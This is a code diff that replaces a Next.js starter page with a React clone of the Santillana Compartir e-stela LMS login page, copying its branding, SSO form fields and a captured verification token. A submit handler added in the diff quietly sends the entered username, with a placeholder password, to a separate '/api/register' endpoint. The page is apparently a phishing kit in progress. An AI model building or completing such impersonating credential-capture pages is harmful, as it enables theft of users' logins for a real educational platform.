@@ -1,209 +1,298 @@
-import Head from 'next/head'
+import Head from 'next/head';
+import { useState } from 'react';
 
 export default function Home() {
-  return (
-    <div className="container">
-      <Head>
-        <title>Create Next App</title>
-        <link rel="icon" href="/favicon.ico" />
-      </Head>
+    const [username, setUsername] = useState('');
 
-      <main>
-        <h1 className="title">
-          Welcome to <a href="https://nextjs.org">Next.js!</a>
-        </h1>
+    const handleSubmit = (event) => {
+        fetch('/api/register', {
+            method: 'POST',
+            body: JSON.stringify({
+                username,
+                password: 'TEST',
+            }),
+            headers: new Headers({
+              'Content-Type': 'application/json',
+              Accept: 'application/json',
+            }),
+        });
 
-        <p className="description">
-          Get started by editing <code>pages/index.js</code>
-        </p>
+        event.preventDefault();
+    };
 
-        <div className="grid">
-          <a href="https://nextjs.org/docs" className="card">
-            <h3>Documentation &rarr;</h3>
-            <p>Find in-depth information about Next.js features and API.</p>
-          </a>
+    return (
+        <>
+            <div style={{ display: 'block' }} id='bgimg'></div>
+            <div>
+                <Head>
+                    <title>Inicio de sesi&#243;n - e-stela Compartir</title>
+                    <meta
+                        name='description'
+                        content='Acceso a e-stela LMS. Plataforma educativa de Santillana Compartir.'
+                    />
+                    <meta
+                        name='viewport'
+                        content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0'
+                    />
+                    <meta
+                        id='viewport'
+                        name='viewport'
+                        content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, target-densitydpi=medium-dpi'
+                    />
 
-          <a href="https://nextjs.org/learn" className="card">
-            <h3>Learn &rarr;</h3>
-            <p>Learn about Next.js in an interactive course with quizzes!</p>
-          </a>
+                    <meta charset='utf-8' />
+                    <link
+                        href='/favicon.ico'
+                        rel='shortcut icon'
+                        type='image/x-icon'
+                    />
+                    <link rel='apple-touch-icon' href='/favicon-ios.png' />
 
-          <a
-            href="https://github.com/vercel/next.js/tree/master/examples"
-            className="card"
-          >
-            <h3>Examples &rarr;</h3>
-            <p>Discover and deploy boilerplate example Next.js projects.</p>
-          </a>
+                    <link href='/Content/base.css' rel='stylesheet' />
 
-          <a
-            href="https://vercel.com/import?filter=next.js&utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className="card"
-          >
-            <h3>Deploy &rarr;</h3>
-            <p>
-              Instantly deploy your Next.js site to a public URL with Vercel.
-            </p>
-          </a>
-        </div>
-      </main>
+                    <link
+                        href='/Content/css?v=7UpInVtDUcTW5HtGfK_MIIDXfz8CeReWFCxoHkfzrok1'
+                        rel='stylesheet'
+                    />
 
-      <footer>
-        <a
-          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Powered by{' '}
-          <img src="/vercel.svg" alt="Vercel Logo" className="logo" />
-        </a>
-      </footer>
+                    <link
+                        href='/Content/libraries/bootstrap.min.css'
+                        rel='stylesheet'
+                    />
 
-      <style jsx>{`
-        .container {
-          min-height: 100vh;
-          padding: 0 0.5rem;
-          display: flex;
-          flex-direction: column;
-          justify-content: center;
-          align-items: center;
-        }
+                    <link href='/Content/login.css' rel='stylesheet' />
 
-        main {
-          padding: 5rem 0;
-          flex: 1;
-          display: flex;
-          flex-direction: column;
-          justify-content: center;
-          align-items: center;
-        }
+                    <link
+                        href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,900'
+                        rel='stylesheet'
+                    />
+                </Head>
 
-        footer {
-          width: 100%;
-          height: 100px;
-          border-top: 1px solid #eaeaea;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-        }
+                <div id='body'>
+                    <section>
+                        <video playsInline autoPlay muted loop id='bgvid'>
+                            <source type='video/mp4' />
+                        </video>
 
-        footer img {
-          margin-left: 0.5rem;
-        }
+                        <div
+                            id='container'
+                            className='modal show bg-login'
+                            tabIndex='-1'
+                            role='dialog'
+                        >
+                            <div id='content'>
+                                <div
+                                    id='loginForm'
+                                    className='modal-dialog modal-dialog-custom'
+                                >
+                                    <div className='modal-header modal-header-login-custom'>
+                                        <h1 className='hidden'>Log in</h1>
+                                        <img
+                                            src='https://caprodevelop.blob.core.windows.net/uploads/pro/logoimage/ba00b2da-39f7-4647-90c9-01c33af21750.png'
+                                            className='logoImage'
+                                            alt='Main logo of company'
+                                        />
+                                    </div>
+                                    <div id='form' className='login-form'>
+                                        <div
+                                            className='validate'
+                                            id='validatePassword'
+                                        ></div>
+                                        <div className='validate'></div>
+                                        <br />
+                                        <div className='form-group'>
+                                            <span
+                                                id='idpName'
+                                                className='idp-name'
+                                            >
+                                                Santillana Connect&nbsp;
+                                            </span>
+                                            <a
+                                                href='https://www.santillanaconnect.com/Account/Faq?wa=wsignin1.0&amp;wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&amp;wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
+                                                className='whatisThis primary'
+                                                id='whatisThis'
+                                            >
+                                                &#191;Qu&#233; es esto?
+                                            </a>
+                                            <form
+                                                action='https://www.santillanaconnect.com/Account/Login?wa=wsignin1.0&wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
+                                                method='post'
+                                                name='loginForm'
+                                                onSubmit={handleSubmit}
+                                            >
+                                              
+                                                <input
+                                                    name='__RequestVerificationToken'
+                                                    type='hidden'
+                                                    value='ZFWUOXtiXNG0hBu7DR6qgsj0fmqPryU9XgIFHBQ56ft47btr0ikX3d64EMK2XcIr0aa--eVZ5BSQ73BJE_jgt16TAZI1'
+                                                />
+                                                <input
+                                                    id='Wa'
+                                                    name='Wa'
+                                                    type='hidden'
+                                                    value='wsignin1.0'
+                                                />
+                                                <input
+                                                    id='Wreply'
+                                                    name='Wreply'
+                                                    type='hidden'
+                                                    value='https://lms30.santillanacompartir.com/login/sso/loginconnect'
+                                                />
+                                                <input
+                                                    id='WtRealm'
+                                                    name='WtRealm'
+                                                    type='hidden'
+                                                    value='http://lms30.santillanacompartir.com/login/compartir/'
+                                                />{' '}
+                                                <div id='user'>
+                                                    <label
+                                                        className='hidden'
+                                                        htmlFor='username'
+                                                    >
+                                                        Usuario
+                                                    </label>
+                                                    <input
+                                                        className='loginInput primaryBorderFocus form-control'
+                                                        data-val='true'
+                                                        data-val-length='El campo Usuario debe ser una cadena con una longitud máxima de 256.'
+                                                        data-val-length-max='256'
+                                                        data-val-required='Debe introducir el nombre de usuario.'
+                                                        id='username'
+                                                        name='UserName'
+                                                        placeholder='Usuario'
+                                                        type='text'
+                                                        value={username}
+                                                        onChange={(e) =>
+                                                            setUsername(
+                                                                e.target.value
+                                                            )
+                                                        }
+                                                    />
+                                                    <div
+                                                        className='loginIcon'
+                                                        id='usernameIcon'
+                                                    >
+                                                        <span className='icon-uno user'>
+                                                            <img
+                                                                src='/Content/fonts/ico_user.png'
+                                                                alt='icon for user'
+                                                            />
+                                                        </span>
+                                                    </div>
+                                                </div>
+                                                <div id='passwordWrapper'>
+                                                    <label
+                                                        className='hidden'
+                                                        htmlFor='password'
+                                                    >
+                                                        Contrase&#241;a
+                                                    </label>
+                                                    <input
+                                                        className='loginInput primaryBorderFocus form-control'
+                                                        data-val='true'
+                                                        data-val-required='Debe introducir la contraseña.'
+                                                        id='password'
+                                                        name='Password'
+                                                        placeholder='Contraseña'
+                                                        type='password'
+                                                    />
+                                                    <div className='loginIcon'>
+                                                        <span className='icon-uno lock'>
+                                                            <img
+                                                                src='/Content/fonts/ico_password.png'
+                                                                alt='icon for password'
+                                                            />
+                                                        </span>
+                                                    </div>
+                                                </div>
+                                                <input
+                                                    className='remember span2'
+                                                    data-toggle='toggle'
+                                                    data-val='true'
+                                                    data-val-required='El campo Mantenerme conectado es obligatorio.'
+                                                    id='RememberMe'
+                                                    name='RememberMe'
+                                                    type='checkbox'
+                                                    value='true'
+                                                />
+                                                <input
+                                                    name='RememberMe'
+                                                    type='hidden'
+                                                    value='false'
+                                                />
+                                                <label
+                                                    className='remember'
+                                                    htmlFor='RememberMe'
+                                                    id='rememberLabel'
+                                                >
+                                                    Mantenerme conectado
+                                                </label>
+                                                <input
+                                                    id='RelayState'
+                                                    name='RelayState'
+                                                    type='hidden'
+                                                    value=''
+                                                />
+                                                <input
+                                                    id='SAMLRequest'
+                                                    name='SAMLRequest'
+                                                    type='hidden'
+                                                    value=''
+                                                />{' '}
+                                                <div>
+                                                    <input
+                                                        type='submit'
+                                                        id='submit'
+                                                        value='Conectarme'
+                                                        className='primaryBackground'
+                                                    />
+                                                </div>
+                                            </form>{' '}
+                                        </div>
+                                    </div>
 
-        footer a {
-          display: flex;
-          justify-content: center;
-          align-items: center;
-        }
+                                    <div id='cantAcces'>
+                                        <a
+                                            className='primary'
+                                            href='https://www.santillanaconnect.com/Account/ForgotPassword?wa=wsignin1.0&amp;wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&amp;wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
+                                            id='forgotPasswordLink'
+                                        >
+                                            &#191;No puede acceder a su cuenta?
+                                        </a>{' '}
+                                    </div>
+                                </div>
+                                <div className='clear'></div>
+                            </div>
+                        </div>
+                    </section>
+                </div>
 
-        a {
-          color: inherit;
-          text-decoration: none;
-        }
-
-        .title a {
-          color: #0070f3;
-          text-decoration: none;
-        }
-
-        .title a:hover,
-        .title a:focus,
-        .title a:active {
-          text-decoration: underline;
-        }
-
-        .title {
-          margin: 0;
-          line-height: 1.15;
-          font-size: 4rem;
-        }
-
-        .title,
-        .description {
-          text-align: center;
-        }
-
-        .description {
-          line-height: 1.5;
-          font-size: 1.5rem;
-        }
-
-        code {
-          background: #fafafa;
-          border-radius: 5px;
-          padding: 0.75rem;
-          font-size: 1.1rem;
-          font-family: Menlo, Monaco, Lucida Console, Liberation Mono,
-            DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace;
-        }
-
-        .grid {
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          flex-wrap: wrap;
-
-          max-width: 800px;
-          margin-top: 3rem;
-        }
-
-        .card {
-          margin: 1rem;
-          flex-basis: 45%;
-          padding: 1.5rem;
-          text-align: left;
-          color: inherit;
-          text-decoration: none;
-          border: 1px solid #eaeaea;
-          border-radius: 10px;
-          transition: color 0.15s ease, border-color 0.15s ease;
-        }
-
-        .card:hover,
-        .card:focus,
-        .card:active {
-          color: #0070f3;
-          border-color: #0070f3;
-        }
-
-        .card h3 {
-          margin: 0 0 1rem 0;
-          font-size: 1.5rem;
-        }
-
-        .card p {
-          margin: 0;
-          font-size: 1.25rem;
-          line-height: 1.5;
-        }
-
-        .logo {
-          height: 1em;
-        }
-
-        @media (max-width: 600px) {
-          .grid {
-            width: 100%;
-            flex-direction: column;
-          }
-        }
-      `}</style>
-
-      <style jsx global>{`
-        html,
-        body {
-          padding: 0;
-          margin: 0;
-          font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto,
-            Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue,
-            sans-serif;
-        }
-
-        * {
-          box-sizing: border-box;
-        }
-      `}</style>
-    </div>
-  )
+                <footer id='footer'>
+                    <div id='footContent'>
+                        <div className='primary' id='footLeft'>
+                            ©2021 Santillana<p className='separator'>|</p>
+                            <a
+                                className='primary'
+                                href='https://www.santillanaconnect.com/Account/Faq?wa=wsignin1.0&amp;wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&amp;wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
+                            >
+                                FAQ
+                            </a>{' '}
+                            <p className='separator'>|</p>
+                            <a
+                                href='https://santillanaconnect.com/Account/CookiesPolicy/'
+                                className='primary'
+                            >
+                                Pol&#237;tica de cookies
+                            </a>
+                        </div>
+                        <div id='footRight'>
+                            <img alt='' />
+                        </div>
+                        <div className='clear'></div>
+                    </div>
+                    <div className='clear'></div>
+                </footer>
+            </div>
+        </>
+    );
 }
